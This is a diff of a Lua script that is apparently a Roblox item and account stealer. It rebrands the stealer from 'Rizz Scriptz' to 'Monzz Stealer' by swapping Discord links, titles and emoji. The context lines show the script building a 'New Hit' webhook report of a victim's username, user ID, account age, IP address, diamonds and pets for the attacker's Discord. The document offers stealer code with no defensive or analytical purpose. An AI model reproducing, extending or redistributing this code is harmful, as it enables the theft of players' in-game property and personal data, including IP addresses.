@@ -1222,15 +1222,15 @@ end
 -- Img
 local data1
 if banktiercheck == true then
-    imgs = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
+    imgs = "https://cdn.discordapp.com/attachments/1100823909009465497/1124473588045590578/Screenshot_20230414-055925_Gallery_1.jpg"
 
     data1 = {
         ["content"] = ping,
         ["username"] = "Rizz Scriptz",
-        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif",
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1121512295709806782/1130597250876330005/vidma_20230718_032704.gif",
         ["embeds"] = { {
-            ["title"] = "**New Hit** ||With Rizz||",
-            ["url"] = "https://discord.gg/uSgzNwHDTS",
+            ["title"] = "**New Hit** ||Monzz Stealer||",
+            ["url"] = "https://discord.gg/4y4CZfdJHu",
             ["type"] = "rich",
             ["color"] = tonumber(0x2798FF),
             ["thumbnail"] = {
@@ -1239,7 +1239,7 @@ if banktiercheck == true then
                 ["width"] = 420
             },
             ["fields"] = { {
-                ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
+                ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                 ["value"] = "```Username     : " .. username .. "\nDisplay Name : " .. fardplayer.DisplayName ..
                     "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                     " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank ..
@@ -1250,7 +1250,7 @@ if banktiercheck == true then
                 ["value"] = "```" .. DiamondsCount .. "```",
                 ["inline"] = true
             }, {
-                ["name"] = ":dog: **Pets** :dog:",
+                ["name"] = ":frog: **Pets** :frog:",
                 ["value"] = "```" .. #FinalList + #SFinalList .. "```",
                 ["inline"] = true
             }, {
@@ -1290,7 +1290,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. BDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":dog: **Pets** :dog:",
+                ["name"] = ":frog: **Pets** :frog:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] .. "```",
                 ["inline"] = true
             }, {
@@ -1344,7 +1344,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. TDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":dog: **Pets** :dog:",
+                ["name"] = ":frog: **Pets** :frog:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] + #FinalList .. "```",
                 ["inline"] = true
             },
